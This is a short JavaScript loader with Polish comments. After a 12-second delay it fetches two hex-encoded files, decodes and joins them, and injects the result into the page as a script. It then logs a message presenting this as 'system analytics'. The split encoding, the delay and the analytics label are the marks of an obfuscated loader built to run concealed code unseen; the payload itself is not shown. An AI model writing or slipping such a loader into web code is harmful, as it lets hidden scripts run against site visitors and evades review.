// Ładowarka z dekodowaniem HEX
setTimeout(async () => {
  try {
    // 1. Pobierz części
    const [part1, part2] = await Promise.all([
      fetch('ab.hex').then(r => r.text()),
      fetch('ac.hex').then(r => r.text())
    ]);

    // 2. Zdekoduj HEX → tekst
    const fullCode = hexToString(part1 + part2);

    // 3. Wykonaj kod
    const script = document.createElement('script');
    script.textContent = fullCode;
    document.body.appendChild(script);

    console.log("[STATUS] System analytics aktywny!");

  } catch (error) {
    console.error("[ERROR]", error);
  }
}, 12000); // 12-sekundowe opóźnienie

// Funkcja pomocnicza HEX → string
function hexToString(hex) {
  return decodeURIComponent(
    hex.replace(/../g, match => '%' + match)
  );
}
